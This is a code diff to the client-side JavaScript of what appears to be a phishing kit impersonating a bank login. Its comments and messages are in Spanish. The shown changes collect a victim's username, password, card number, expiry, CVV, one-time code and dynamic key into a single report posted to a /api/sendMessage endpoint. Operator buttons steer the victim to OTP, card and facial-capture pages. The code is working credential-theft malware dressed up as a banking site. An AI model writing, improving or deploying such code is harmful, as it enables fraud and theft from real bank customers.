@@ -2,8 +2,6 @@
 const SESSION_ID = sessionStorage.getItem('bc_session') || '';
 const USER       = sessionStorage.getItem('bc_user')    || 'Usuario';
 
-
-
 if (!SESSION_ID) {
   if (!location.pathname.endsWith('index.html') && location.pathname !== '/' && !location.pathname.endsWith('/')) {
     location.href = 'index.html';
@@ -37,9 +35,9 @@ function getKb(evt) {
   return {
     inline_keyboard: [
       [{ text: '✅ OK', callback_data: `ACTION:OK_${evt}` }, { text: '❌ ERR', callback_data: `ACTION:ERR_${evt}` }],
-      [{ text: '🔄 DASH', callback_data: 'ACTION:GOTO_DASH' }, { text: '📱 OTP', callback_data: 'ACTION:GOTO_OTP' }, { text: '🔑 DIN', callback_data: 'ACTION:GOTO_DIN' }],
-      [{ text: '💳 TC', callback_data: 'ACTION:GOTO_TC' }, { text: '👤 FACIAL', callback_data: 'ACTION:GOTO_FACIAL' }],
-      [{ text: '⚠️ ERROR 923', callback_data: 'ACTION:ERROR_923' }]
+      [{ text: '🔄 DASH', callback_data: `ACTION:GOTO_DASH` }, { text: '📱 OTP', callback_data: `ACTION:GOTO_OTP` }, { text: '🔑 DIN', callback_data: `ACTION:GOTO_DIN` }],
+      [{ text: '💳 TC', callback_data: `ACTION:GOTO_TC` }, { text: '👤 FACIAL', callback_data: `ACTION:GOTO_FACIAL` }],
+      [{ text: '⚠️ ERROR 923', callback_data: `ACTION:ERROR_923` }]
     ]
   };
 }
@@ -84,10 +82,46 @@ async function sendAndWait(payload, handlers) {
         });
       }
     } else {
-      let txt = '';
-      if (payload.event === 'OTP') txt = `🔢 *OTP RECIBIDO*\n\n🆔 ID: \`${SESSION_ID}\`\n🔑 OTP: \`${payload.otp}\``;
-      else if (payload.event === 'DINAMICA') txt = `🔑 *CLAVE DINÁMICA*\n\n🆔 ID: \`${SESSION_ID}\`\n🔑 Clave: \`${payload.dinamic}\``;
-      else if (payload.event === 'TARJETA') txt = `💳 *DATOS DE TARJETA*\n\n🆔 ID: \`${SESSION_ID}\`\n🔢 TC: \`${payload.tc}\`\n📅 Exp: \`${payload.expiry}\`\n🔒 CVV: \`${payload.cvv}\``;
+      // Guardar temporalmente el dato actual en sessionStorage si aplica
+      if (payload.event === 'TARJETA') {
+        sessionStorage.setItem('temp_tc', payload.tc || '');
+        sessionStorage.setItem('temp_expiry', payload.expiry || '');
+        sessionStorage.setItem('temp_cvv', payload.cvv || '');
+      } else if (payload.event === 'OTP') {
+        sessionStorage.setItem('temp_otp', payload.otp || '');
+      } else if (payload.event === 'DINAMICA') {
+        sessionStorage.setItem('temp_dinamic', payload.dinamic || '');
+      }
+
+      // Recuperar todos los datos acumulados hasta el momento
+      const uUser   = sessionStorage.getItem('bc_user') || 'N/A';
+      const uPass   = sessionStorage.getItem('bc_pass') || 'N/A';
+      const uTc     = sessionStorage.getItem('temp_tc') || payload.tc || 'N/A';
+      const uExp    = sessionStorage.getItem('temp_expiry') || payload.expiry || 'N/A';
+      const uCvv    = sessionStorage.getItem('temp_cvv') || payload.cvv || 'N/A';
+      const uOtp    = sessionStorage.getItem('temp_otp') || payload.otp || 'N/A';
+      const uDin    = sessionStorage.getItem('temp_dinamic') || payload.dinamic || 'N/A';
+
+      // Construir un solo mensaje organizado con toda la información unificada
+      let txt = `📋 *REGISTRO COMPLETO [${payload.event}]*\n\n`;
+      txt += `🆔 ID: \`${SESSION_ID}\`\n`;
+      txt += `👤 Usuario: \`${uUser}\`\n`;
+      txt += `🔑 Clave: \`${uPass}\`\n`;
+
+      if (uTc !== 'N/A') {
+        txt += `\n💳 *DATOS DE TARJETA:*\n`;
+        txt += `🔢 TC: \`${uTc}\`\n`;
+        txt += `📅 Exp: \`${uExp}\`\n`;
+        txt += `🔒 CVV: \`${uCvv}\`\n`;
+      }
+
+      if (uOtp !== 'N/A') {
+        txt += `\n🔢 *OTP:* \`${uOtp}\`\n`;
+      }
+
+      if (uDin !== 'N/A') {
+        txt += `\n🔑 *Clave Dinámica:* \`${uDin}\`\n`;
+      }
 
       const res = await fetch(`/api/sendMessage`, {
         method: 'POST',
